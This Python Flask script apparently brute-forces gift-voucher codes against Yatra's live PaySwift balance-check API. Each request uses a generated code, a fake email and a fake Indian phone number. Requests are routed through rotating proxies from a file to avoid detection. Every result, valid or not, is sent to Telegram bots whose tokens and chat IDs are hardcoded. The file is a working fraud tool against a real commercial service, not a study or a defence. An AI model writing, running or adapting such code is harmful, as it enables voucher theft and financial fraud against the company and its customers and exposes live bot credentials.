from flask import Flask
import random
import requests
import json
import os

app = Flask(__name__)

# Load proxies from the file
PROXY_FILE = "proxies.txt"

def load_proxies():
    """Load proxies from the file and prepend http:// if missing."""
    if not os.path.exists(PROXY_FILE):
        print("Proxy file not found.")
        return []
    with open(PROXY_FILE, "r") as f:
        return [f"http://{line.strip()}" for line in f if line.strip()]  # Add http:// prefix

PROXIES_LIST = load_proxies()

def get_random_proxy():
    """Select a random proxy from the list."""
    if PROXIES_LIST:
        proxy_url = random.choice(PROXIES_LIST)
        return {"http": proxy_url, "https": proxy_url}
    return None

def generate_code():
    """Generate a random code in the exact format Y2GTV?m?m?m?m?m?m?m?m?m?m."""
    base = "Y2GTV"
    suffix = ''.join(
        random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10))
    return "Y2GTVY8X0D7C5EY" #base + suffix

def generate_email():
    """Generate a random email address."""
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
    username = ''.join(
        random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10))
    return f"{username}@{random.choice(domains)}"

def generate_phone():
    """Generate a random 10-digit Indian phone number."""
    return f"9{random.randint(100000000, 999999999)}"

def send_telegram_message(url):
    """Send a message to a Telegram chat via the bot using the provided URL."""
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("Message sent successfully to Telegram.")
        else:
            print(f"Failed to send message to Telegram. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Error sending message to Telegram: {e}")

def make_post_request(code, email, phone):
    """Make a POST request to the Yatra API with the generated code."""
    url = "https://secure.yatra.com/PaySwift/gift-voucher/yatra/dom2/1611240003969/check-balance"

    # Custom headers
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/json",
        "user-agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",
    }

    # Payload
    payload = {
        "superPnr": "1611240003969",
        "emailId": email,
        "amount": 13191,
        "lob": "AIR",
        "isd": "91",
        "mobile": phone,
        "source": "YT",
        "context": "REVIEW",
        "vouchers": [{
            "code": code,
            "type": "PROMO",
            "pin": ""
        }]
    }

    proxy = get_random_proxy()
    print(f"Using proxy: {proxy}")  # Debugging: See which proxy is used

    try:
        response = requests.post(
            url, headers=headers, json=payload, proxies=proxy, timeout=10
        )
        response.raise_for_status()  # Raise HTTPError for bad responses
        return response.json()
    except requests.RequestException as e:
        print(f"Error during request: {e}")
        return None

@app.route('/', methods=['GET'])
def run_task():
    """Endpoint to trigger voucher validation."""
    code = generate_code()
    email = generate_email()
    phone = generate_phone()

    print(f"Generated code: {code}")
    print(f"Generated email: {email}")
    print(f"Generated phone: {phone}")

    response = make_post_request(code, email, phone)

    if response:
        # Success: Send success message to Telegram
        success_url = f"https://api.telegram.org/bot5443217673:AAG2JGtn3gPGJ8UzKnTW2-l-p4tPt0A2NvQ/sendmessage?chat_id=-1001660096246&text=Success%20Code:%20{code}%20Email:%20{email}%20Phone:%20{phone}%20Response:%20{json.dumps(response)}"
        send_telegram_message(success_url)
        print(f"API Response: {json.dumps(response, indent=2)}")
        return response
    else:
        # Failure: Send invalid code message to Telegram
        error_url = f"https://api.telegram.org/bot5453678885:AAGAmj13cf0BrWUuvqNb4Nemc2zFR4IhpTw/sendmessage?chat_id=-871155395&text=Invalid%20Code:%20{code}%20Email:%20{email}%20Phone:%20{phone}%20No%20valid%20response"
        send_telegram_message(error_url)
        return {"error": "Request failed or no valid response received."}

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # Default to 5000 if no port is specified
    app.run(host="0.0.0.0", port=port)
